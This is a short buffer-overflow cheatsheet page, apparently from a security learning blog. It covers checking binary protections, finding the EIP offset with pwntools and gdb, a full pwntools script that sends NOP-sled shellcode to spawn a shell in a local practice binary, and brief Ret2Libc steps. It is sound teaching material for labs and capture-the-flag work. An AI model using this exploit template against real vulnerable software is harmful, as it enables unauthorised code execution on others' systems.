---
title: Buffer Overflow
description: Buffer Overflow cheatsheet
date: 1970-01-23
categories: [Cheatsheets]
tags: [cheatsheets,buffer-overflow]
---

- [pwntools](https://docs.pwntools.com/en/stable/)
- check protections
```console
checksec <binary>
cat /proc/sys/kernel/randomize_va_space # ASLR
```

## Stack Shellcode

NX Stack, ASLR and Stack Canaries should be disabled

Detect the offset:
```console
cyclic 100 > pattern
gdb pwn
> r < pattern # copy value of the EIP register
```

Run the exploit:
```python
#!/usr/bin/env python2

from pwn import *

context.update(arch="i386", os="linux")

shellcode = shellcraft.sh()

payload  = cyclic(cyclic_find(0x61616167)) # EIP value
payload += p32(0xdeadbeef) # or p32(0xffffd510+200) = ESP address + offset
payload += "\x90" * 100
payload += asm(shellcode)

p = process("./pwn")
p.recvline()
p.sendline(payload)
p.interactive()
```

## Ret2Libc

- ASLR and Stack Canaries should be disabled
- get address of system function, of exit function and of the string `/bin/sh`
